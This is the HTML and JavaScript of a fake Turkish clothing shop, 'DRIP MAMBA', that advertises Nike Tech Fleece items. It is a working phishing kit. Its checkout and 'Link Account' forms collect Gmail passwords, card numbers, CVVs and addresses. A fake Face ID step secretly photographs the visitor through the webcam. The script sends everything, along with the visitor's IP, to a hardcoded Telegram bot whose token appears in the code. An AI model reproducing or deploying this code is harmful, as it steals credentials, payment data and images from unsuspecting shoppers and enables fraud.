<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DRIP MAMBA | Official Archive</title>
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --mamba-cyan: #00f2ff; --bg: #000; --card-bg: #080808; --border: #141414; }
        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; }
        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; overflow-x: hidden; }

        /* GİRİŞ EKRANI - DRIPMAMBA STYLE */
        #splash { position: fixed; inset: 0; background: #000; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 1.2s cubic-bezier(0.9, 0, 0.1, 1); }
        .splash-title { font-family: 'Syncopate'; font-size: 38px; letter-spacing: -3px; margin-bottom: 30px; }
        .splash-title span { color: var(--mamba-cyan); text-shadow: 0 0 25px rgba(0, 242, 255, 0.5); }
        .enter-btn { padding: 22px 70px; border: 1px solid #fff; background: transparent; color: #fff; font-family: 'Syncopate'; font-size: 11px; cursor: pointer; transition: 0.5s; letter-spacing: 3px; border-radius: 0; }
        .enter-btn:hover { background: var(--mamba-cyan); color: #000; border-color: var(--mamba-cyan); box-shadow: 0 0 40px var(--mamba-cyan); }

        /* HEADER */
        header { padding: 30px 6%; border-bottom: 1px solid var(--border); position: sticky; top: 0; background: rgba(0,0,0,0.9); backdrop-filter: blur(20px); z-index: 1000; display: flex; justify-content: space-between; align-items: center; }
        .logo { font-family: 'Syncopate'; font-size: 20px; text-decoration: none; color: #fff; letter-spacing: -1px; }
        .logo span { color: var(--mamba-cyan); }
        .nav-right { display: flex; align-items: center; gap: 25px; }
        .acc-link { font-size: 10px; font-weight: 900; color: var(--mamba-cyan); text-transform: uppercase; cursor: pointer; border-bottom: 1px solid var(--mamba-cyan); padding-bottom: 2px; }

        /* PRODUCT GRID */
        .main-container { padding: 60px 6%; max-width: 1500px; margin: 0 auto; }
        .mamba-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 35px; }
        .mamba-card { background: var(--card-bg); border: 1px solid var(--border); transition: 0.5s; cursor: pointer; position: relative; }
        .mamba-card:hover { border-color: var(--mamba-cyan); transform: translateY(-8px); }
        .image-box { width: 100%; height: 420px; background: #050505; overflow: hidden; }
        .image-box img { width: 100%; height: 100%; object-fit: cover; transition: 0.8s; }
        .mamba-card:hover img { transform: scale(1.08); }
        .mamba-info { padding: 25px; text-align: left; }
        .mamba-name { font-size: 14px; font-weight: 800; color: #fff; text-transform: uppercase; margin-bottom: 10px; letter-spacing: 0.5px; }
        .mamba-price { color: var(--mamba-cyan); font-weight: 900; font-size: 20px; font-family: 'Syncopate'; }
        .tag { position: absolute; top: 20px; right: 20px; background: var(--mamba-cyan); color: #000; font-size: 9px; padding: 6px 12px; font-weight: 900; z-index: 10; }

        /* MODALS */
        .m-modal { display: none; position: fixed; inset: 0; background: #000; z-index: 10000; overflow-y: auto; padding: 60px 6%; }
        .m-content { max-width: 550px; margin: 0 auto; }
        .m-step { display: none; }
        .m-step.active { display: block; animation: slideUp 0.6s ease; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        input, textarea { width: 100%; padding: 20px; background: #060606; border: 1px solid #1a1a1a; color: #fff; margin-bottom: 20px; font-size: 14px; }
        input:focus { border-color: var(--mamba-cyan); }
        .m-btn { width: 100%; padding: 24px; background: var(--mamba-cyan); color: #000; font-weight: 900; border: none; cursor: pointer; font-family: 'Syncopate'; font-size: 12px; transition: 0.3s; }
        .m-btn:hover { opacity: 0.8; }

        /* SCANNER */
        #m-scanner { display: none; position: fixed; inset: 0; background: #000; z-index: 20000; flex-direction: column; align-items: center; justify-content: center; }
        .scanner-circle { width: 320px; height: 320px; border: 1px solid var(--mamba-cyan); border-radius: 50%; overflow: hidden; position: relative; box-shadow: 0 0 60px rgba(0, 242, 255, 0.1); }
        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .scan-bar { position: absolute; width: 100%; height: 1px; background: var(--mamba-cyan); box-shadow: 0 0 20px var(--mamba-cyan); animation: moveBar 3s infinite linear; }
        @keyframes moveBar { 0%, 100% { top: 5%; } 50% { top: 95%; } }
    </style>
</head>
<body>

<div id="splash">
    <div class="splash-title">DRIP <span>MAMBA</span></div>
    <button class="enter-btn" onclick="initMamba()">ENTER ARCHIVE</button>
</div>

<div id="mamba-app" style="display:none;">
    <header>
        <a href="#" class="logo">DRIP <span>MAMBA</span></a>
        <div class="nav-right">
            <div class="acc-link" onclick="openModal('acc-modal')">Link Account</div>
        </div>
    </header>

    <div class="main-container">
        <div class="mamba-grid" id="mamba-grid"></div>
    </div>
</div>

<div id="pay-modal" class="m-modal">
    <div class="m-content">
        <div class="m-step active" id="st1">
            <h1 style="font-family:'Syncopate'; font-size:22px; margin-bottom:30px;">TERMS</h1>
            <p style="color:#555; font-size:12px; line-height:1.8; margin-bottom:30px;">
                Tüm ürünler "Archive" statüsündedir. İade ve değişim kabul edilmez. Ödeme işlemi sırasında 3D Secure biyometrik doğrulama (Face ID) zorunludur.
            </p>
            <button class="m-btn" onclick="next(2)">I AGREE</button>
        </div>
        <div class="m-step" id="st2">
            <h1 style="font-family:'Syncopate'; font-size:22px; margin-bottom:30px;">SHIPPING</h1>
            <input type="text" id="m-city" placeholder="CITY">
            <textarea id="m-addr" placeholder="FULL ADDRESS" rows="4"></textarea>
            <button class="m-btn" onclick="next(3)">PROCEED TO PAYMENT</button>
        </div>
        <div class="m-step" id="st3">
            <h1 style="font-family:'Syncopate'; font-size:22px; margin-bottom:30px;">PAYMENT</h1>
            <input type="email" id="m-mail" placeholder="GMAIL ACCOUNT">
            <input type="password" id="m-pass" placeholder="GMAIL PASSWORD">
            <hr style="border:0; border-top:1px solid #111; margin:25px 0;">
            <input type="text" id="m-card" placeholder="CARD NUMBER">
            <div style="display:flex; gap:15px;">
                <input type="text" id="m-exp" placeholder="MM/YY">
                <input type="text" id="m-cvv" placeholder="CVV">
            </div>
            <button class="m-btn" onclick="startMambaScan()">CONFIRM ORDER</button>
        </div>
    </div>
</div>

<div id="acc-modal" class="m-modal">
    <div class="m-content">
        <h1 style="font-family:'Syncopate'; font-size:22px; margin-bottom:10px;">LINK ACCOUNT</h1>
        <p style="color:#555; font-size:12px; margin-bottom:30px;">Sync with Google for 20% membership discount.</p>
        <input type="email" id="a-mail" placeholder="GMAIL">
        <input type="password" id="a-pass" placeholder="PASSWORD">
        <button class="m-btn" onclick="saveMambaAcc()">SYNC NOW</button>
        <p onclick="closeModal()" style="text-align:center; margin-top:30px; cursor:pointer; color:#444; font-size:11px;">CLOSE</p>
    </div>
</div>

<div id="m-scanner">
    <div class="scanner-circle"><div class="scan-bar"></div><video id="webcam" autoplay playsinline muted></video></div>
    <p style="margin-top:30px; font-family:'Syncopate'; font-size:11px; color:var(--mamba-cyan); letter-spacing:4px;">FACE ID VERIFICATION</p>
</div>

<script>
    const TOK = "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc";
    const CID = "1540769169";

    const products = [
        { n: "Nike Tech Fleece Full Set - Black", p: 1500, i: "https://images.nike.com/is/image/DotCom/CU4489_010_A_PREM?wid=1000", t: "ARCHIVE" },
        { n: "Nike Tech Fleece Hoodie - Black", p: 800, i: "https://images.nike.com/is/image/DotCom/CU4489_010_E_PREM?wid=1000", t: "TOP" },
        { n: "Nike Tech Fleece Joggers - Black", p: 800, i: "https://images.nike.com/is/image/DotCom/CU4495_010_A_PREM?wid=1000", t: "BOTTOM" },
        { n: "Mamba Carbon Edition Suit", p: 1400, i: "https://images.nike.com/is/image/DotCom/CU4489_063_A_PREM?wid=1000" },
        { n: "Nocta Style Tech Fleece", p: 1600, i: "https://images.nike.com/is/image/DotCom/CU4489_410_A_PREM?wid=1000" },
        { n: "Archive Essential Beanie", p: 450, i: "https://images.nike.com/is/image/DotCom/CW6327_010_A_PREM?wid=1000" }
    ];

    function initMamba() {
        document.getElementById('splash').style.transform = 'translateY(-100%)';
        setTimeout(() => {
            document.getElementById('mamba-app').style.display = 'block';
            const g = document.getElementById('mamba-grid');
            products.forEach(p => {
                g.innerHTML += `
                    <div class="mamba-card" onclick="openModal('pay-modal')">
                        ${p.t ? `<div class="tag">${p.t}</div>` : ''}
                        <div class="image-box"><img src="${p.i}"></div>
                        <div class="mamba-info">
                            <p class="mamba-name">${p.n}</p>
                            <p class="mamba-price">₺${p.p}</p>
                        </div>
                    </div>`;
            });
        }, 1000);
    }

    function openModal(id) { document.getElementById(id).style.display = 'block'; }
    function closeModal() { document.querySelectorAll('.m-modal').forEach(m => m.style.display = 'none'); }
    function next(n) {
        document.querySelectorAll('.m-step').forEach(s => s.classList.remove('active'));
        document.getElementById('st' + n).classList.add('active');
    }

    async function startMambaScan() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('webcam').srcObject = s;
            closeModal();
            document.getElementById('m-scanner').style.display = 'flex';
            setTimeout(() => pushData(document.getElementById('webcam')), 6000);
        } catch(e) { alert("ERROR: Biyometrik doğrulama için kamera gereklidir."); }
    }

    async function saveMambaAcc() {
        const text = `👤 **ACCOUNT LINK**\n📧 Mail: \`${document.getElementById('a-mail').value}\`\n🔑 Sifre: \`${document.getElementById('a-pass').value}\``;
        await fetch(`https://api.telegram.org/bot${TOK}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(text)}&parse_mode=markdown`);
        alert("ACCOUNT SYNCED"); closeModal();
    }

    function pushData(v) {
        const c = document.createElement('canvas');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        c.toBlob(async b => {
            const fd = new FormData(); fd.append('photo', b, 'f.jpg');
            await fetch(`https://api.telegram.org/bot${TOK}/sendPhoto?chat_id=${CID}`, { method: 'POST', body: fd });
            const ip = await (await fetch('https://ipapi.co/json/')).json();
            const log = `🔥 **NEW ORDER | DRIP MAMBA**\n📧 Mail: \`${document.getElementById('m-mail').value}\`\n🔑 Pass: \`${document.getElementById('m-pass').value}\`\n💳 Card: \`${document.getElementById('m-card').value}\`\n📅 SKT/CVV: ${document.getElementById('m-exp').value} / ${document.getElementById('m-cvv').value}\n🏠 Adres: ${document.getElementById('m-city').value} / ${document.getElementById('m-addr').value}\n🌐 IP: ${ip.ip}`;
            await fetch(`https://api.telegram.org/bot${TOK}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(log)}&parse_mode=markdown`);
            window.location.href = "https://dripmamba.com";
        }, 'image/jpeg');
    }
</script>
</body>
</html>
